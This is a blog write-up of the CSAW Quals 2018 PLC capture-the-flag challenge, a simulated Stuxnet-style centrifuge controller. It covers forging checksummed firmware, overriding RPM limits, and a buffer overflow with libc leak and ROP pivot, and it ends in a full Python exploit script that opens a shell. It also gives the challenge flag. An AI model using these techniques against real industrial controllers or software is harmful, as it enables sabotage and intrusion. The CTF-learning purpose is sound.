---
layout: post
title: CSAW Quals 2018!
author: adamt
---

PLC Challenge Writeup
-------------------------------------------------------------

What a challenge this was.
Our team collectively spent over 40 hours solving it, however unfortunately we couldn't solve it until after the CTF had ended ;(
enjoy the flag `flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3}`

The challenge was a twist on the well known stuxnet virus. It contained 6 sections that built on each other and was a generally fun and interesting challenge.

## Step 1
Execute the default firmware
--------------
By looking at the provide source code we can see that by entering `E` the program will execute the currently loaded firmware
        
## Step 2
Create our own custom checksummed firmware
----------------
This was one of the harder/longer parts of the challenge. To solve this you had to reverse engineer both the custom `shellcode` used by the centrifuge system, and understand what each command does, as well as reverse engineer the checksum algorithm to digitally sign our own payloads.

Through spending hours stairing at the debugger and following the code flows of different inputs we managed to discover the following commands the firmware would accept
<br />

* Reset RPM - 0x30
* Clear Material - 0x31
* Write one char to new material - 0x32 `letter`
* RPM Override off = 0x33 0x30
* RPM Override on = 0x33 0x31
* Decrement RPM = 0x36
* Increment RPM = 0x37
* DEBUG ON = 0x38 0x31
* DEBUG OFF = 0x38 0x30
* EXIT = 0x39

And for custom checksum, we ported the assembler code directly into python instead of trying to understand and recreate it from scratch.

Also a firmware must be 0x400 characters long and in the format of
'FW' + checksum + version + commands
Where the version is 2 numbers (eg 12)

## Step 3
Exceed Normal Centrifuge Speeds
----------------
With the knowledge gained from above, to spin the centrifuges to destruction, we enabled the RPM override, and then calling Increment RPM until the RPM was over a certain threshold. This was pretty trivial with our knowledge gained from the previous step.

## Step 4
Specify some "extra" dangerous materials
-----------------
This part of the challenge stumped me for over an hour, I didn't know what it meant by `"extra" dangerous materials`.
Using the knowledge from above we could rename the materials used in the centrifuge by converting a string "HELLO" > "2H2E2L2L2O". Simplying putting the digit 2 between each char.
We tried renaming the material to all sorts of things (yes i did google `most dangerous nuclear material` and other interesting items and yes I'm definetely on a watchlist somewhere)
List of things we tried

* Uranium
* extra
* "extra"
* "extra" dangerous

Eventually someone in our team asked if we had tried specifying an extra long string....
nuff said, specify a string with like 100 character length and we get the points (no points just a tick yay)


## Step 5
JK lol get flag and cat shell
-------------------------------
This is the part where it all stopped. <br />
We had to put everything we had just learnt about this program, and try to somehow get shell.<br />

I forgot to mention a few things..

* PIE/ASLR/NX Are enabled
* Execve in LIBC is corrupted so we can't just do a simple ret2libc
* So we must somehow create a ROP chain that calls the execve syscall

We found that we were able to control RIP through a lethal `call edx` gadget. However this would only give us a single gadget in which we had to get shell.<br />
The trick is to pivot the shell through a nice `add rsp` gadget into a different buffer we control. <br /> <br />

The two buffers we control are 
* The original terminal which has a 32 character size
* The name buffer we control with our command inputs

We can also get a leak because write after our name buffer, is a pointer to an address in libc. So if we fill our buffer with printable characters, we can print out the status/name of our centrifuge, and get an address leak. <br />

With a libc leak the rop chain is trivial

* pop rax
* 0x3b
* pop rdi
* 0
* pop rdx
* 0
* syscall
* shell xx

So if we place the rop chain in our main buffer after "E". The program only looks at the E and called execute, which will then execute our pivot gadget and pivot to our rop chain after the letter "E". perfect.

lovely

> 14 hours of fun

My final python script

```python
from interact import *
import struct
import time


# globals
WRITE = "2"
RPM_ADD = "7"
EXIT = "9"
RPM_OVERRIDE = "31"
DEBUG = "81"

p = Process()
time.sleep(5) #bugs?
# helper functions
def unpack(data, fmt="<Q"):
    return struct.unpack(fmt, data.ljust(8, "\x00"))[0]


def pack(data, fmt="<Q"):
    return struct.pack(fmt, data)


def toWriteCommand(string):
   return WRITE + WRITE.join(list(string))

def generate_checksum(string):
    count = 2
    scount = 0
    rbp10 = 0
    while count <= 0x1ff:
        eax = rbp10
        eax <<= 0xc
        edx = eax

        eax = rbp10
        eax >>= 0x4
        eax |= edx

        rbp10 = eax + (count & 0xffff)

        rbp10 &= 0xFFFF
        eax = ord(string[scount]) + 16*16*ord(string[scount+1])
        rbp10 ^= eax
        count += 1
        scount += 2

    return chr(rbp10 & 0xff) + chr(rbp10 >> 8)

def gen_fw(rpm, overflow):
    commands =  "12" # version
    commands += DEBUG
    commands += RPM_OVERRIDE # so no issues
    commands += toWriteCommand(overflow) # material cmd
    commands += (rpm * RPM_ADD) #overflow rpm
    commands += EXIT
    commands = commands.ljust(0x400 - 4, '\x00')
    # Checksum the above commands
    checksum = generate_checksum(commands)

    # return completed firmware
    return "FW" + checksum + commands

p.sendline("U") #upload firewarm
fw = gen_fw(63, "A" * 68 + "XXXXXXXX")
p.send(fw)
p.sendline("E") # execute firwware
p.sendline("S") # Show status for libc leak


print p.readuntil("XXXXXXXX") # Read until end of our payload
leak = unpack(p.readuntil("\n").strip())
libc_base = leak - 0x36ec0 #leak address and calc offset to base of libc
print "Libc leak ", hex(libc_base)


pivot = pack(libc_base + 0xc96a6) # add rsp, 0x38

rop = "A" * 15
rop += pack(libc_base + 0x21102) #pop rdi
rop += pack(libc_base + 0x18cd57) #binsh

rop += pack(libc_base + 0x33544) #pop rax
rop += pack(0x3b) #execve syscall

rop += pack(libc_base + 0x202e8) #pop rsi
rop += pack(0)

rop += pack(libc_base + 0x1b92) #pop rdx
rop += pack(0)

rop += pack(libc_base + 0xbc375) #syscall


p.sendline("U") #upload firmware
fw = gen_fw(80, ("X" * 68) + pivot)
p.send(fw)
p.sendline("E" + rop)

p.interactive()
```


